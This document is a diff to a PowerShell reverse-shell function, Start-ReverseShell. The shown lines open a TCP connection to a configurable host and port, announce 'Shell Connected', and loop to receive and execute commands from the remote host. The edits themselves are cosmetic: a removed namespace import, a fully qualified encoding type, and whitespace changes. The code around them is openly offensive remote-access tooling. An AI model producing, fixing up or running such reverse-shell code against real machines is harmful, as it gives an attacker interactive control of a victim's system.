@@ -1,4 +1,3 @@
-using namespace System.Text
 Function Start-ReverseShell {
     param (
         [string]$IP = "127.0.0.1" ,
@@ -10,9 +9,9 @@ Function Start-ReverseShell {
         $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
         $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535 | ForEach-Object {0}
-
+        
         # Send a connection confirmation
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('Shell Connected: ' + (Get-Date).ToString() + "`n")
+        $sendbytes = ([System.Text.Encoding]::ASCII).GetBytes('Shell Connected: ' + (Get-Date).ToString() + "`n")
         $stream.Write($sendbytes, 0, $sendbytes.Length)
 
         # Enter a loop to receive commands from the remote host and execute them
@@ -31,6 +30,7 @@ Function Start-ReverseShell {
             $stream.Flush()
         }
     }
+
     finally {
         # Close the connection
         if ($client) {
